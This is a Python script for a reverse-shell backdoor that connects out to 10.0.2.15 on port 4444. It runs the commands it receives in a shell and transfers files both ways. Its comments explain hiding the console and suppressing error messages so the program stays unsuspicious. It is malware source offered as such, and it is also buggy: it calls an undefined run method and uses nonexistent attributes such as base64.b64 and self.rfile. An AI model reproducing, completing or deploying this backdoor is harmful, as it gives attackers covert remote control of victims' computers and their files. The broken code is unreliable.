#!usr/bin/env python
import socket, subprocess, json, os, base64, sys
 
class Transmitter:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM, protocol = 0)
        self.connection.connect((ip, port))
    
    def  send_recv(self, cmds):
        return subprocess.check_output(cmds, shell=True, stderr= subprocess.DEVNULL, stdin=subprocess.DEVNULL)  #...if we want to run the backdoor without the console type --noconsole and stderr, stdin occures as we remob=ved the console and the standard output is managed by the check_output function                                                                 
    
    def encode(self, data):
         json_send = json.dumps(data)
         self.connection.send(json_send)
         
    def decode(self):
        json_recv = ""
        while True:
            try:
                json_recv = json_recv + self.connection.recv(1024)
                return json.loads(json_recv)
            except ValueError:
                continue
            
    def change_dir(self, path):
        os.chdir(path)
        return "changing the directory to" + path
    
    def read_file(self, file):   #function to read file
        with open(file, "rb") as rfile:
            return base64.b64(self.rfile.read())
        
    def write_file(self, file, contenta):
        with open(file, "wb") as wfile:
            self.wfile.write(contenta)
            return "uploaded the required file"
            
    
    def compile_commands(self):
        while True:    
            cmds = self.decode()

            try:
                if cmds[0] == "exit":
                    result = self.connection.close()
                    exit()
    
                elif cmds[0] == "cd" and len(cmds)>1:
                    result = self.change_dir(cmds[1])
    
                elif cmds[0] == "downloads":
                    result = self.read_file(cmds[1])
                    
                elif cmds[0] == "upload":
                    result = self.write_file(cmds[1], cmds[2])
                
                else:
                    result = self.send_recv(cmds)
            except Exception:
                cmds = "<<<*ERROR OCCURED*>>>"
            
            self.encode(result)
        
try:    
    el_transmit = Transmitter("10.0.2.15", 4444)
    el_transmit.run()
except Exception:
    sys.exit()                     #...try except is used por que when we convert the backdoor into executable adn when it fails t0 connect back it produces the error msg which is very suspicious